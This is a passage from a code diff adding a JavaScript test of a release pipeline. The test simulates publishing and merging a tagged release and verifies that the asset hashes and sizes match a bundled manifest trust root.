+      `candidate P      ${fixture.candidate.slice(0, 12)} advertises ${advertisedVersion(fixture, fixture.candidate)}, root ${rootOf(fixture, fixture.candidate).version}  <- the lag`,
+    );
+
+    const finalized = runFinalize(fixture);
+    assert.ok(finalized.run.ok, finalized.run.failed?.stderr);
+    const head = finalized.run.outputs.commit.sha;
+    const atHead = { 'needs.finalize.outputs.head-sha': head, [HEAD_EXPR]: head };
+    trace(
+      `release head H   ${head.slice(0, 12)} advertises ${advertisedVersion(fixture, head)}, root ${rootOf(fixture, head).version}`,
+    );
+
+    const beforeValidate = ghCalls(fixture).length;
+    const validated = runJobSteps({
+      workflow: release,
+      jobId: 'validate',
+      cwd: checkout(fixture, head),
+      ctx: releaseCtx(fixture, { ...treeCtx(fixture, fixture.candidate), ...atHead }),
+      env: baseEnv(fixture),
+      only: [PREPARED_STEP],
+    });
+    assert.ok(validated.ok, validated.failed?.stderr);
+    assert.equal(ghCalls(fixture).length, beforeValidate, 'validation is offline');
+
+    const publishRun = runPublish(fixture, PUBLISH_PATH, { ctx: atHead });
+    assert.ok(publishRun.ok, publishRun.failed?.stderr);
+    assert.equal(publishRun.outputs.decide.action, 'publish');
+    assert.equal(fixture.gh.state().releases[TAG].draft, false);
+    assert.equal(fixture.gh.state().releases[TAG].target, head);
+    assert.equal(
+      originRef(fixture, 'refs/heads/main'),
+      fixture.base,
+      'the bytes are public while main still advertises V-1',
+    );
+    trace(
+      `published        ${TAG} -> ${head.slice(0, 12)} while main is still ${advertisedVersion(fixture, 'refs/heads/main')}`,
+    );
+
+    const ciRun = runCi(fixture, checkout(fixture, head), { 'github.base_ref': 'main' });
+    assert.ok(ciRun.ok, ciRun.failed?.stderr);
+    trace(`CI on H          ${stepStdout(ciRun, CI_STEP).trim().split('\n').pop()}`);
+
+    const state = fixture.gh.state();
+    state.checks[head] = [check('success')];
+    writeFileSync(join(fixture.root, 'gh-state', 'state.json'), JSON.stringify(state));
+    const merged = runMerge(fixture, atHead);
+    assert.ok(merged.ok, merged.failed?.stderr);
+    assert.ok(ghCalls(fixture).includes(`pr merge --squash --match-head-commit ${head} 11`));
+
+    // The squash lands exactly H's tree on main, so H is what an install made
+    // the instant the version becomes visible reads.
+    assert.equal(fixture.gh.state().prs[0].state, 'MERGED');
+    assert.equal(originRef(fixture, 'refs/heads/main'), fixture.base, 'nothing else reached main');
+    assert.equal(advertisedVersion(fixture, head), VERSION);
+    const root = rootOf(fixture, head);
+    assert.equal(root.version, VERSION);
+    for (const path of MANIFEST_PATHS) {
+      assert.equal(
+        git(fixture.root, '--git-dir', fixture.origin, 'show', `${head}:${path}`),
+        manifestFor(),
+        `${path} is the same trust root`,
+      );
+    }
+    const bundled = JSON.parse(
+      git(fixture.root, '--git-dir', fixture.origin, 'show', `${head}:runner-manifest.json`),
+    );
+    for (const asset of [bundled.assets.ios[0], bundled.assets.android[0]]) {
+      const bytes = readFileSync(fixture.gh.assetPath(TAG, asset.name));
+      assert.equal(createHash('sha256').update(bytes).digest('hex'), asset.sha256, asset.name);
+      assert.equal(bytes.length, asset.bytes, asset.name);
+    }
+    trace(
+      `merged           squash --match-head-commit ${head.slice(0, 12)} -> main advertises ${advertisedVersion(fixture, head)}, root ${root.version}`,
+    );
+    trace(`  bundled root   ${root.ios}`);
+    trace(`                 ${root.android}`);
+    trace(
+      `  public ${TAG}  both zips + runner-manifest.json, bytes verified against the bundled root`,
+    );
+  } finally {
+    fixture.cleanup();
+  }
 });
